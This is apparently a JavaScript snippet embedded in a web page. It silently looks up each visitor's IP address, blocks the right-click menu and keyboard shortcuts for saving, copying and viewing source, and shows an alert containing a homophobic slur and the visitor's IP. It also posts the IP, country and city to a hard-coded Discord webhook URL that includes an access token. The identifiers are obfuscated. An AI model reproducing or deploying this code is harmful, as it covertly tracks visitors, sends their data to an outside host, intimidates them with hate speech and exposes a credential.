function noskidz(ipData) {
  const _0x36e9b8 = {
    embeds: [{
      color: 16579836,
      fields: [{
        name: 'IP:',
        value: ipData.ip || 'Unknown',
      }, {
        name: 'Country:',
        value: ipData.country || 'Unknown',
      }, {
        name: 'City:',
        value: ipData.city || 'Unknown',
      }],
    }],
  };

  fetch('https://discord.com/api/webhooks/1192845321546498199/DiJqRKu8HTFDv74wz5uH7I044jLDd1Xn4xxeAu5-gPsY9lMJ27hRD5G7-gfWnlQcPxoN', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(_0x36e9b8),
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Failed to post to Discord webhook');
    }
  })
  .catch(error => {
    console.error('Error:', error);
  });
}

fetch('https://api.ipify.org?format=json')
  .then(_0x1850bd => _0x1850bd.json())
  .then(_0x3c55a8 => {
    const _0x546cf0 = _0x3c55a8.ip;

    window.addEventListener('keydown', _0x5ca9cf => {
      if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'S' || _0x5ca9cf.key === 's' || _0x5ca9cf.key === 'C' || _0x5ca9cf.key === 'E' || _0x5ca9cf.key === 'e' || _0x5ca9cf.key === 'I' || _0x5ca9cf.key === 'i' || _0x5ca9cf.key === "Ã„Â±" || _0x5ca9cf.key === 'K' || _0x5ca9cf.key === 'k' || _0x5ca9cf.key === 'U' || _0x5ca9cf.key === 'u')) {
        _0x5ca9cf.preventDefault();
        alert('fucking faggot, ur ip btw: ' + _0x546cf0);
        
        noskidz(_0x3c55a8); // Call noskidz with the IP data
      }
    });

    document.addEventListener('contextmenu', function (_0x425474) {
      _0x425474.preventDefault();
    });
  });
